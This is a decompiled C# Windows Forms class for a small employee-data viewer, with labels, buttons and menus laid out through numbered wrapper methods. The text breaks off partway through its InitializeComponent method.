using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Printing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace EmployeeData;

[DesignerGenerated]
public class MainForm : Form
{
	public struct EmployeeData
	{
		public string firstName;

		public string midName;

		public string lastName;

		public long employeeNumber;

		public string department;

		public string telephone;

		public string ext;

		public string email;
	}

	private IContainer components;

	private bool init;

	private static double DCA;

	public string strFilePath;

	public StreamReader inputFile;

	private short maxRecord;

	private short numberRecord;

	public EmployeeData[] emplyoeeData;

	internal virtual Button btnClear
	{
		[CompilerGenerated]
		get
		{
			return _btnClear;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = btnClear_Click;
			Button val = _btnClear;
			if (val != null)
			{
				MainForm.smethod_76((Control)(object)val, eventHandler_);
			}
			_btnClear = value;
			val = _btnClear;
			if (val != null)
			{
				MainForm.smethod_77((Control)(object)val, eventHandler_);
			}
		}
	}

	internal virtual Button btnNext
	{
		[CompilerGenerated]
		get
		{
			return _btnNext;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = btnNext_Click;
			Button val = _btnNext;
			if (val != null)
			{
				MainForm.smethod_76((Control)(object)val, eventHandler_);
			}
			_btnNext = value;
			val = _btnNext;
			if (val != null)
			{
				MainForm.smethod_77((Control)(object)val, eventHandler_);
			}
		}
	}

	[field: AccessedThroughProperty("lblEmail")]
	internal virtual Label lblEmail
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblExtension")]
	internal virtual Label lblExtension
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblTelephone")]
	internal virtual Label lblTelephone
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblDept")]
	internal virtual Label lblDept
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblEmployeeNum")]
	internal virtual Label lblEmployeeNum
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblLastName")]
	internal virtual Label lblLastName
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblMiddleName")]
	internal virtual Label lblMiddleName
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblFirstName")]
	internal virtual Label lblFirstName
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label8")]
	internal virtual Label Label8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label7")]
	internal virtual Label Label7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label6")]
	internal virtual Label Label6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label5")]
	internal virtual Label Label5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label9")]
	internal virtual Label Label9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("GroupBox1")]
	internal virtual GroupBox GroupBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("OpenFileDialog1")]
	internal virtual OpenFileDialog OpenFileDialog1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("MenuStrip1")]
	internal virtual MenuStrip MenuStrip1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("FileToolStripMenuItem")]
	internal virtual ToolStripMenuItem FileToolStripMenuItem
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuFileOpen
	{
		[CompilerGenerated]
		get
		{
			return _mnuFileOpen;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = mnuFileOpen_Click;
			ToolStripMenuItem val = _mnuFileOpen;
			if (val != null)
			{
				MainForm.smethod_78((ToolStripItem)(object)val, eventHandler_);
			}
			_mnuFileOpen = value;
			val = _mnuFileOpen;
			if (val != null)
			{
				MainForm.smethod_79((ToolStripItem)(object)val, eventHandler_);
			}
		}
	}

	internal virtual ToolStripMenuItem PrintToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _PrintToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = PrintToolStripMenuItem_Click;
			ToolStripMenuItem printToolStripMenuItem = _PrintToolStripMenuItem;
			if (printToolStripMenuItem != null)
			{
				MainForm.smethod_78((ToolStripItem)(object)printToolStripMenuItem, eventHandler_);
			}
			_PrintToolStripMenuItem = value;
			printToolStripMenuItem = _PrintToolStripMenuItem;
			if (printToolStripMenuItem != null)
			{
				MainForm.smethod_79((ToolStripItem)(object)printToolStripMenuItem, eventHandler_);
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripMenuItem1")]
	internal virtual ToolStripSeparator ToolStripMenuItem1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem ExitToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _ExitToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = ExitToolStripMenuItem_Click;
			ToolStripMenuItem exitToolStripMenuItem = _ExitToolStripMenuItem;
			if (exitToolStripMenuItem != null)
			{
				MainForm.smethod_78((ToolStripItem)(object)exitToolStripMenuItem, eventHandler_);
			}
			_ExitToolStripMenuItem = value;
			exitToolStripMenuItem = _ExitToolStripMenuItem;
			if (exitToolStripMenuItem != null)
			{
				MainForm.smethod_79((ToolStripItem)(object)exitToolStripMenuItem, eventHandler_);
			}
		}
	}

	[field: AccessedThroughProperty("EdiToolStripMenuItem")]
	internal virtual ToolStripMenuItem EdiToolStripMenuItem
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem AddRecordToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _AddRecordToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = AddRecordToolStripMenuItem_Click;
			ToolStripMenuItem addRecordToolStripMenuItem = _AddRecordToolStripMenuItem;
			if (addRecordToolStripMenuItem != null)
			{
				MainForm.smethod_78((ToolStripItem)(object)addRecordToolStripMenuItem, eventHandler_);
			}
			_AddRecordToolStripMenuItem = value;
			addRecordToolStripMenuItem = _AddRecordToolStripMenuItem;
			if (addRecordToolStripMenuItem != null)
			{
				MainForm.smethod_79((ToolStripItem)(object)addRecordToolStripMenuItem, eventHandler_);
			}
		}
	}

	[field: AccessedThroughProperty("SaveFileDialog1")]
	internal virtual SaveFileDialog SaveFileDialog1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual PrintDocument PrintDocument1
	{
		[CompilerGenerated]
		get
		{
			return _PrintDocument1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			PrintPageEventHandler printPageEventHandler_ = new PrintPageEventHandler(PrintDocument1_PrintPage);
			PrintDocument printDocument = _PrintDocument1;
			if (printDocument != null)
			{
				MainForm.smethod_80(printDocument, printPageEventHandler_);
			}
			_PrintDocument1 = value;
			printDocument = _PrintDocument1;
			if (printDocument != null)
			{
				MainForm.smethod_81(printDocument, printPageEventHandler_);
			}
		}
	}

	[field: AccessedThroughProperty("PrintPreviewDialog1")]
	internal virtual PrintPreviewDialog PrintPreviewDialog1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem SearchToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _SearchToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = SearchToolStripMenuItem_Click;
			ToolStripMenuItem searchToolStripMenuItem = _SearchToolStripMenuItem;
			if (searchToolStripMenuItem != null)
			{
				MainForm.smethod_78((ToolStripItem)(object)searchToolStripMenuItem, eventHandler_);
			}
			_SearchToolStripMenuItem = value;
			searchToolStripMenuItem = _SearchToolStripMenuItem;
			if (searchToolStripMenuItem != null)
			{
				MainForm.smethod_79((ToolStripItem)(object)searchToolStripMenuItem, eventHandler_);
			}
		}
	}

	[field: AccessedThroughProperty("HelpToolStripMenuItem")]
	internal virtual ToolStripMenuItem HelpToolStripMenuItem
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem AboutToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _AboutToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = AboutToolStripMenuItem_Click;
			ToolStripMenuItem aboutToolStripMenuItem = _AboutToolStripMenuItem;
			if (aboutToolStripMenuItem != null)
			{
				MainForm.smethod_78((ToolStripItem)(object)aboutToolStripMenuItem, eventHandler_);
			}
			_AboutToolStripMenuItem = value;
			aboutToolStripMenuItem = _AboutToolStripMenuItem;
			if (aboutToolStripMenuItem != null)
			{
				MainForm.smethod_79((ToolStripItem)(object)aboutToolStripMenuItem, eventHandler_);
			}
		}
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public MainForm()
	{
		init = false;
		strFilePath = "";
		maxRecord = 9;
		numberRecord = 0;
		emplyoeeData = new EmployeeData[checked(maxRecord + 1)];
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				MainForm.smethod_0((IDisposable)components);
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_01ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_0246: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0348: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_043e: Unknown result type (might be due to invalid IL or missing references)
		//IL_04b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_052e: Unknown result type (might be due to invalid IL or missing references)
		//IL_05a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_061e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0696: Unknown result type (might be due to invalid IL or missing references)
		//IL_070e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0786: Unknown result type (might be due to invalid IL or missing references)
		//IL_07fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0872: Unknown result type (might be due to invalid IL or missing references)
		//IL_08e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_095d: Unknown result type (might be due to invalid IL or missing references)
		//IL_09d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b96: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bb7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f88: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f92: Expected O, but got Unknown
		ComponentResourceManager resourceManager_ = MainForm.smethod_2(MainForm.smethod_1(typeof(MainForm).TypeHandle));
		btnClear = MainForm.smethod_3();
		btnNext = MainForm.smethod_3();
		lblEmail = MainForm.smethod_4();
		lblExtension = MainForm.smethod_4();
		lblTelephone = MainForm.smethod_4();
		lblDept = MainForm.smethod_4();
		lblEmployeeNum = MainForm.smethod_4();
		lblLastName = MainForm.smethod_4();
		lblMiddleName = MainForm.smethod_4();
		lblFirstName = MainForm.smethod_4();
		Label8 = MainForm.smethod_4();
		Label7 = MainForm.smethod_4();
		Label6 = MainForm.smethod_4();
		Label5 = MainForm.smethod_4();
		Label4 = MainForm.smethod_4();
		Label3 = MainForm.smethod_4();
		Label2 = MainForm.smethod_4();
		Label9 = MainForm.smethod_4();
		GroupBox1 = MainForm.smethod_5();
		OpenFileDialog1 = MainForm.smethod_6();
		MenuStrip1 = MainForm.smethod_7();
		FileToolStripMenuItem = MainForm.smethod_8();
		mnuFileOpen = MainForm.smethod_8();
		PrintToolStripMenuItem = MainForm.smethod_8();
		ToolStripMenuItem1 = MainForm.smethod_9();
		ExitToolStripMenuItem = MainForm.smethod_8();
		EdiToolStripMenuItem = MainForm.smethod_8();
		AddRecordToolStripMenuItem = MainForm.smethod_8();
		SearchToolStripMenuItem = MainForm.smethod_8();
		HelpToolStripMenuItem = MainForm.smethod_8();
		AboutToolStripMenuItem = MainForm.smethod_8();
		SaveFileDialog1 = MainForm.smethod_10();
		PrintDocument1 = MainForm.smethod_11();
		PrintPreviewDialog1 = MainForm.smethod_12();
		Label1 = MainForm.smethod_4();
		MainForm.smethod_13((Control)(object)GroupBox1);
		MainForm.smethod_13((Control)(object)MenuStrip1);
		MainForm.smethod_14((Control)(object)this);
		MainForm.smethod_15((Control)(object)btnClear, new Point(328, 389));
		MainForm.smethod_16((Control)(object)btnClear, new Padding(4));
		MainForm.smethod_17((Control)(object)btnClear, "btnClear");
		MainForm.smethod_18((Control)(object)btnClear, new Size(107, 49));
		MainForm.smethod_19((Control)(object)btnClear, 12);
		MainForm.smethod_20((ButtonBase)(object)btnClear, "C&lear");
		MainForm.smethod_21((ButtonBase)(object)btnClear, bool_0: true);
		MainForm.smethod_15((Control)(object)btnNext, new Point(159, 389));
		MainForm.smethod_16((Control)(object)btnNext, new Padding(4));
		MainForm.smethod_17((Control)(object)btnNext, "btnNext");
		MainForm.smethod_18((Control)(object)btnNext, new Size(107, 49));
		MainForm.smethod_19((Control)(object)btnNext, 11);
		MainForm.smethod_20((ButtonBase)(object)btnNext, "&Next Record");
		MainForm.smethod_21((ButtonBase)(object)btnNext, bool_0: true);
		MainForm.smethod_22(lblEmail, (BorderStyle)2);
		MainForm.smethod_15((Control)(object)lblEmail, new Point(169, 250));
		MainForm.smethod_16((Control)(object)lblEmail, new Padding(4, 0, 4, 0));
		MainForm.smethod_17((Control)(object)lblEmail, "lblEmail");
		MainForm.smethod_18((Control)(object)lblEmail, new Size(311, 25));
		MainForm.smethod_19((Control)(object)lblEmail, 22);
		MainForm.smethod_23(lblEmail, (ContentAlignment)16);
		MainForm.smethod_22(lblExtension, (BorderStyle)2);
		MainForm.smethod_15((Control)(object)lblExtension, new Point(169, 218));
		MainForm.smethod_16((Control)(object)lblExtension, new Padding(4, 0, 4, 0));
		MainForm.smethod_17((Control)(object)lblExtension, "lblExtension");
		MainForm.smethod_18((Control)(object)lblExtension, new Size(311, 25));
		MainForm.smethod_19((Control)(object)lblExtension, 21);
		MainForm.smethod_23(lblExtension, (ContentAlignment)16);
		MainForm.smethod_22(lblTelephone, (BorderStyle)2);
		MainForm.smethod_15((Control)(object)lblTelephone, new Point(169, 186));
		MainForm.smethod_16((Control)(object)lblTelephone, new Padding(4, 0, 4, 0));
		MainForm.smethod_17((Control)(object)lblTelephone, "lblTelephone");
		MainForm.smethod_18((Control)(object)lblTelephone, new Size(311, 25));
		MainForm.smethod_19((Control)(object)lblTelephone, 20);
		MainForm.smethod_23(lblTelephone, (ContentAlignment)16);
		MainForm.smethod_22(lblDept, (BorderStyle)2);
		MainForm.smethod_15((Control)(object)lblDept, new Point(169, 154));
		MainForm.smethod_16((Control)(object)lblDept, new Padding(4, 0, 4, 0));
		MainForm.smethod_17((Control)(object)lblDept, "lblDept");
		MainForm.smethod_18((Control)(object)lblDept, new Size(311, 25));
		MainForm.smethod_19((Control)(object)lblDept, 19);
		MainForm.smethod_23(lblDept, (ContentAlignment)16);
		MainForm.smethod_22(lblEmployeeNum, (BorderStyle)2);
		MainForm.smethod_15((Control)(object)lblEmployeeNum, new Point(169, 122));
		MainForm.smethod_16((Control)(object)lblEmployeeNum, new Padding(4, 0, 4, 0));
		MainForm.smethod_17((Control)(object)lblEmployeeNum, "lblEmployeeNum");
		MainForm.smethod_18((Control)(object)lblEmployeeNum, new Size(311, 25));
		MainForm.smethod_19((Control)(object)lblEmployeeNum, 18);
		MainForm.smethod_23(lblEmployeeNum, (ContentAlignment)16);
		MainForm.smethod_22(lblLastName, (BorderStyle)2);
		MainForm.smethod_15((Control)(object)lblLastName, new Point(169, 90));
		MainForm.smethod_16((Control)(object)lblLastName, new Padding(4, 0, 4, 0));
		MainForm.smethod_17((Control)(object)lblLastName, "lblLastName");
		MainForm.smethod_18((Control)(object)lblLastName, new Size(311, 25));
		MainForm.smethod_19((Control)(object)lblLastName, 17);
		MainForm.smethod_23(lblLastName, (ContentAlignment)16);
		MainForm.smethod_22(lblMiddleName, (BorderStyle)2);
		MainForm.smethod_15((Control)(object)lblMiddleName, new Point(169, 58));
		MainForm.smethod_16((Control)(object)lblMiddleName, new Padding(4, 0, 4, 0));
		MainForm.smethod_17((Control)(object)lblMiddleName, "lblMiddleName");
		MainForm.smethod_18((Control)(object)lblMiddleName, new Size(311, 25));
		MainForm.smethod_19((Control)(object)lblMiddleName, 16);
		MainForm.smethod_23(lblMiddleName, (ContentAlignment)16);
		MainForm.smethod_22(lblFirstName, (BorderStyle)2);
		MainForm.smethod_15((Control)(object)lblFirstName, new Point(169, 26));
		MainForm.smethod_16((Control)(object)lblFirstName, new Padding(4, 0, 4, 0));
		MainForm.smethod_17((Control)(object)lblFirstName, "lblFirstName");
		MainForm.smethod_18((Control)(object)lblFirstName, new Size(311, 25));
		MainForm.smethod_19((Control)(object)lblFirstName, 15);
		MainForm.smethod_23(lblFirstName, (ContentAlignment)16);
		MainForm.smethod_24(Label8, bool_0: true);
		MainForm.smethod_15((Control)(object)Label8, new Point(56, 255));
		MainForm.smethod_16((Control)(object)Label8, new Padding(4, 0, 4, 0));
		MainForm.smethod_17((Control)(object)Label8, "Label8");
		MainForm.smethod_18((Control)(object)Label8, new Size(107, 17));
		MainForm.smethod_19((Control)(object)Label8, 14);
		MainForm.smethod_25(Label8, "E-mail Address:");
		MainForm.smethod_24(Label7, bool_0: true);
		MainForm.smethod_15((Control)(object)Label7, new Point(87, 223));
		MainForm.smethod_16((Control)(object)Label7, new Padding(4, 0, 4, 0));
		MainForm.smethod_17((Control)(object)Label7, "Label7");
		MainForm.smethod_18((Control)(object)Label7, new Size(73, 17));
		MainForm.smethod_19((Control)(object)Label7, 12);
		MainForm.smethod_25(Label7, "Extension:");
		MainForm.smethod_24(Label6, bool_0: true);
		MainForm.smethod_15((Control)(object)Label6, new Point(80, 191));
		MainForm.smethod_16((Control)(object)Label6, new Padding(4, 0, 4, 0));
		MainForm.smethod_17((Control)(object)Label6, "Label6");
		MainForm.smethod_18((Control)(object)Label6, new Size(80, 17));
		MainForm.smethod_19((Control)(object)Label6, 10);
		MainForm.smethod_25(Label6, "Telephone:");
		MainForm.smethod_24(Label5, bool_0: true);
		MainForm.smethod_15((Control)(object)Label5, new Point(75, 159));
		MainForm.smethod_16((Control)(object)Label5, new Padding(4, 0, 4, 0));
		MainForm.smethod_17((Control)(object)Label5, "Label5");
		MainForm.smethod_18((Control)(object)Label5, new Size(86, 17));
		MainForm.smethod_19((Control)(object)Label5, 8);
		MainForm.smethod_25(Label5, "Department:");
		MainForm.smethod_24(Label4, bool_0: true);
		MainForm.smethod_15((Control)(object)Label4, new Point(33, 127));
		MainForm.smethod_16((Control)(object)Label4, new Padding(4, 0, 4, 0));
		MainForm.smethod_17((Control)(object)Label4, "Label4");
		MainForm.smethod_18((Control)(object)Label4, new Size(128, 17));
		MainForm.smethod_19((Control)(object)Label4, 6);
		MainForm.smethod_25(Label4, "Employee Number:");
		MainForm.smethod_24(Label3, bool_0: true);
		MainForm.smethod_15((Control)(object)Label3, new Point(80, 95));
		MainForm.smethod_16((Control)(object)Label3, new Padding(4, 0, 4, 0));
		MainForm.smethod_17((Control)(object)Label3, "Label3");
		MainForm.smethod_18((Control)(object)Label3, new Size(80, 17));
		MainForm.smethod_19((Control)(object)Label3, 4);
		MainForm.smethod_25(Label3, "Last Name:");
		MainForm.smethod_24(Label2, bool_0: true);
		MainForm.smethod_15((Control)(object)Label2, new Point(65, 63));
		MainForm.smethod_16((Control)(object)Label2, new Padding(4, 0, 4, 0));
		MainForm.smethod_17((Control)(object)Label2, "Label2");
		MainForm.smethod_18((Control)(object)Label2, new Size(94, 17));
		MainForm.smethod_19((Control)(object)Label2, 2);
		MainForm.smethod_25(Label2, "Middle Name:");
		MainForm.smethod_24(Label9, bool_0: true);
		MainForm.smethod_15((Control)(object)Label9, new Point(81, 31));
		MainForm.smethod_16((Control)(object)Label9, new Padding(4, 0, 4, 0));
		MainForm.smethod_17((Control)(object)Label9, "Label9");
		MainForm.smethod_18((Control)(object)Label9, new Size(80, 17));
		MainForm.smethod_19((Control)(object)Label9, 0);
		MainForm.smethod_25(Label9, "First Name:");
		MainForm.smethod_27(MainForm.smethod_26((Control)(object)GroupBox1), (Control)(object)lblEmail);
		MainForm.smethod_27(MainForm.smethod_26((Control)(object)GroupBox1), (Control)(object)lblExtension);
		MainForm.smethod_27(MainForm.smethod_26((Control)(object)GroupBox1), (Control)(object)lblTelephone);
		MainForm.smethod_27(MainForm.smethod_26((Control)(object)GroupBox1), (Control)(object)lblDept);
		MainForm.smethod_27(MainForm.smethod_26((Control)(object)GroupBox1), (Control)(object)lblEmployeeNum);
		MainForm.smethod_27(MainForm.smethod_26((Control)(object)GroupBox1), (Control)(object)lblLastName);
		MainForm.smethod_27(MainForm.smethod_26((Control)(object)GroupBox1), (Control)(object)lblMiddleName);
		MainForm.smethod_27(MainForm.smethod_26((Control)(object)GroupBox1), (Control)(object)lblFirstName);
		MainForm.smethod_27(MainForm.smethod_26((Control)(object)GroupBox1), (Control)(object)Label8);
		MainForm.smethod_27(MainForm.smethod_26((Control)(object)GroupBox1), (Control)(object)Label7);
		MainForm.smethod_27(MainForm.smethod_26((Control)(object)GroupBox1), (Control)(object)Label6);
		MainForm.smethod_27(MainForm.smethod_26((Control)(object)GroupBox1), (Control)(object)Label5);
		MainForm.smethod_27(MainForm.smethod_26((Control)(object)GroupBox1), (Control)(object)Label4);
		MainForm.smethod_27(MainForm.smethod_26((Control)(object)GroupBox1), (Control)(object)Label3);
		MainForm.smethod_27(MainForm.smethod_26((Control)(object)GroupBox1), (Control)(object)Label2);
		MainForm.smethod_27(MainForm.smethod_26((Control)(object)GroupBox1), (Control)(object)Label9);
		MainForm.smethod_15((Control)(object)GroupBox1, new Point(44, 64));
		MainForm.smethod_16((Control)(object)GroupBox1, new Padding(4));
		MainForm.smethod_17((Control)(object)GroupBox1, "GroupBox1");
		MainForm.smethod_28((Control)(object)GroupBox1, new Padding(4));
		MainForm.smethod_18((Control)(object)GroupBox1, new Size(506, 295));
		MainForm.smethod_19((Control)(object)GroupBox1, 10);
		MainForm.smethod_29(GroupBox1, bool_0: false);
		MainForm.smethod_30(GroupBox1, "Enter Employee Data");
		MainForm.smethod_31((FileDialog)(object)OpenFileDialog1, "OpenFileDialog1");
		MainForm.smethod_32((ToolStrip)(object)MenuStrip1, new Size(20, 20));
		MainForm.smethod_34(MainForm.smethod_33((ToolStrip)(object)MenuStrip1), (ToolStripItem[])(object)new ToolStripItem[4]
		{
			(ToolStripItem)FileToolStripMenuItem,
			(ToolStripItem)EdiToolStripMenuItem,
			(ToolStripItem)SearchToolStripMenuItem,
			(ToolStripItem)HelpToolStripMenuItem
		});
		MainForm.smethod_15((Control)(object)MenuStrip1, new Point(0, 0));
		MainForm.smethod_17((Control)(object)MenuStrip1, "MenuStrip1");
		MainForm.smethod_18((Control)(object)MenuStrip1, new Size(582, 28));
		MainForm.smethod_19((Control)(object)MenuStrip1, 14);
		MainForm.smethod_35((Control)(object)MenuStrip1, "MenuStrip1");
		MainForm.smethod_34(MainForm.smethod_36((ToolStripDropDownItem)(object)FileToolStripMenuItem), (ToolStripItem[])(object)new ToolStripItem[4]
		{
			(ToolStripItem)mnuFileOpen,
			(ToolStripItem)PrintToolStripMenuItem,
			(ToolStripItem)ToolStripMenuItem1,
			(ToolStripItem)ExitToolStripMenuItem
		});
		MainForm.smethod_37((ToolStripItem)(object)FileToolStripMenuItem, "FileToolStripMenuItem");
		MainForm.smethod_38((ToolStripItem)(object)FileToolStripMenuItem, new Size(44, 24));
		MainForm.smethod_39((ToolStripItem)(object)FileToolStripMenuItem, "File");
		MainForm.smethod_37((ToolStripItem)(object)mnuFileOpen, "mnuFileOpen");
		MainForm.smethod_38((ToolStripItem)(object)mnuFileOpen, new Size(120, 26));
		MainForm.smethod_39((ToolStripItem)(object)mnuFileOpen, "&Open");
		MainForm.smethod_37((ToolStripItem)(object)PrintToolStripMenuItem, "PrintToolStripMenuItem");
		MainForm.smethod_38((ToolStripItem)(object)PrintToolStripMenuItem, new Size(120, 26));
		MainForm.smethod_39((ToolStripItem)(object)PrintToolStripMenuItem, "&Print");
		MainForm.smethod_37((ToolStripItem)(object)ToolStripMenuItem1, "ToolStripMenuItem1");
		MainForm.smethod_38((ToolStripItem)(object)ToolStripMenuItem1, new Size(117, 6));
		MainForm.smethod_37((ToolStripItem)(object)ExitToolStripMenuItem, "ExitToolStripMenuItem");
		MainForm.smethod_38((ToolStripItem)(object)ExitToolStripMenuItem, new Size(120, 26));
		MainForm.smethod_39((ToolStripItem)(object)ExitToolStripMenuItem, "&Exit");
		MainForm.smethod_34(MainForm.smethod_36((ToolStripDropDownItem)(object)EdiToolStripMenuItem), (ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)AddRecordToolStripMenuItem });
		MainForm.smethod_37((ToolStripItem)(object)EdiToolStripMenuItem, "EdiToolStripMenuItem");
		MainForm.smethod_38((ToolStripItem)(object)EdiToolStripMenuItem, new Size(47, 24));
		MainForm.smethod_39((ToolStripItem)(object)EdiToolStripMenuItem, "&Edit");
		MainForm.smethod_37((ToolStripItem)(object)AddRecordToolStripMenuItem, "AddRecordToolStripMenuItem");
		MainForm.smethod_38((ToolStripItem)(object)AddRecordToolStripMenuItem, new Size(163, 26));
		MainForm.smethod_39((ToolStripItem)(object)AddRecordToolStripMenuItem, "&Add Record");
		MainForm.smethod_37((ToolStripItem)(object)SearchToolStripMenuItem, "SearchToolStripMenuItem");
		MainForm.smethod_38((ToolStripItem)(object)SearchToolStripMenuItem, new Size(65, 24));
		MainForm.smethod_39((ToolStripItem)(object)SearchToolStripMenuItem, "&Search");
		MainForm.smethod_34(MainForm.smethod_36((ToolStripDropDownItem)(object)HelpToolStripMenuItem), (ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)AboutToolStripMenuItem });
		MainForm.smethod_37((ToolStripItem)(object)HelpToolStripMenuItem, "HelpToolStripMenuItem");
		MainForm.smethod_38((ToolStripItem)(object)HelpToolStripMenuItem, new Size(53, 24));
		MainForm.smethod_39((ToolStripItem)(object)HelpToolStripMenuItem, "&Help");
		MainForm.smethod_37((ToolStripItem)(object)AboutToolStripMenuItem, "AboutToolStripMenuItem");
		MainForm.smethod_38((ToolStripItem)(object)AboutToolStripMenuItem, new Size(216, 26));
		MainForm.smethod_39((ToolStripItem)(object)AboutToolStripMenuItem, "&About");
		MainForm.smethod_40(PrintPreviewDialog1, new Size(0, 0));
		MainForm.smethod_41(PrintPreviewDialog1, new Size(0, 0));
		MainForm.smethod_42((Form)(object)PrintPreviewDialog1, new Size(400, 300));
		MainForm.smethod_43(PrintPreviewDialog1, bool_0: true);
		MainForm.smethod_45(PrintPreviewDialog1, (Icon)MainForm.smethod_44((ResourceManager)resourceManager_, "PrintPreviewDialog1.Icon"));
		MainForm.smethod_17((Control)(object)PrintPreviewDialog1, "PrintPreviewDialog1");
		MainForm.smethod_46(PrintPreviewDialog1, bool_0: false);
		MainForm.smethod_24(Label1, bool_0: true);
		MainForm.smethod_15((Control)(object)Label1, jjjj(new Point(367, 462), f: true));
		MainForm.smethod_17((Control)(object)Label1, "Label1");
		MainForm.smethod_18((Control)(object)Label1, new Size(141, 17));
		MainForm.smethod_19((Control)(object)Label1, 15);
		MainForm.smethod_25(Label1, "Smith Amornsaensuk");
		MainForm.smethod_47((ContainerControl)(object)this, new SizeF(8f, 16f));
		MainForm.smethod_48((ContainerControl)(object)this, (AutoScaleMode)1);
		MainForm.smethod_49((Form)(object)this, new Size(582, 491));
		MainForm.smethod_27(MainForm.smethod_50((Control)(object)this), (Control)(object)Label1);
		MainForm.smethod_27(MainForm.smethod_50((Control)(object)this), (Control)(object)btnClear);
